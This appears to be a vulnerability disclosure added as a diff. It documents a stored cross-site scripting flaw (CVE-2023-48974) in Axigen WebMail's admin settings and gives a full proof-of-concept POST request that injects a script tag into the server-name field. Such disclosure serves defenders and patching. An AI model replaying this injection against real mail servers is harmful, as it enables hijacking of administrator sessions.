@@ -1,0 +1,65 @@
+# Exploit Title: Axigen < 10.5.7 - Persistent Cross-Site Scripting
+# Date: 2023-09-25
+# Exploit Author: Vinnie McRae - RedTeamer IT Security
+# Vendor Homepage: https://www.axigen.com/
+# Software Link: https://www.axigen.com/mail-server/download/
+# Version: (10.5.7) and older version of Axigen WebMail
+# Tested on: firefox, chrome
+# CVE: CVE-2023-48974
+
+Description
+
+The `serverName_input` parameter is vulnerable to stored cross-site
+scripting (XSS) due to unsanitized or unfiltered processing. This means
+that an attacker can inject malicious code into this parameter, which will
+then be executed by other users when they view the page where the parameter
+is used. This is affecting authenticated administrators, and the attack can
+be used to attack other administrators with more permissions.
+
+Exploitation
+
+1. Login as administrator
+2. Navigate to "global settings"
+3. Change server name to <script>alert(1)</script>
+
+PoC of the POST request:
+
+```
+POST /?_h=1bb40e85937506a7186a125bd8c5d7ef&page=gl_set HTTP/1.1
+Host: localhost:9443
+Cookie: eula=true;
+WMSessionObject=%7B%22accountFilter%22%3A%22%22%2C%22currentDomainName%22%3A%22axigen%22%2C%22currentPrincipal%22%3A%22nada%22%2C%22domainFilter%22%3A%22%22%2C%22folderRecipientFilter%22%3A%22%22%2C%22groupFilter%22%3A%22%22%2C%22helpContainer%22%3A%22opened%22%2C%22leftMenu%22%3A%5B%22rights%22%2C%22services%22%2C%22clustering%22%2C%22domains%22%2C%22logging%22%2C%22backup%22%2C%22security%22%5D%2C%22mlistFilter%22%3A%22%22%2C%22premiumFilter%22%3A%22%22%2C%22sslCertificateFilter%22%3A%22%22%7D;
+webadminIsModified=false; webadminIsUpdated=true; webadminIsSaved=true;
+public_language=en; _hadmin=6a8ed241fe53d1b28f090146e4c65f52;
+menuLeftTopPosition=-754
+Content-Type: multipart/form-data;
+boundary=---------------------------41639384187581032291088896642
+Content-Length: 12401
+Connection: close
+
+-----------------------------41639384187581032291088896642
+Content-Disposition: form-data; name="serverName_input"
+
+<script>alert(1)</script>
+-----------------------------41639384187581032291088896642
+Content-Disposition: form-data; name="primary_domain_input"
+
+axigen
+-----------------------------41639384187581032291088896642
+Content-Disposition: form-data; name="ssl_random_file_input"
+
+--SNIP--
+
+-----------------------------41639384187581032291088896642
+Content-Disposition: form-data; name="update"
+
+Save Configuration
+-----------------------------41639384187581032291088896642--
+```
+
+
+
+#______________________________
+#Vinnie McRae
+#RedTeamer IT Security
+#Blog: redteamer.de/blog-beitrag/
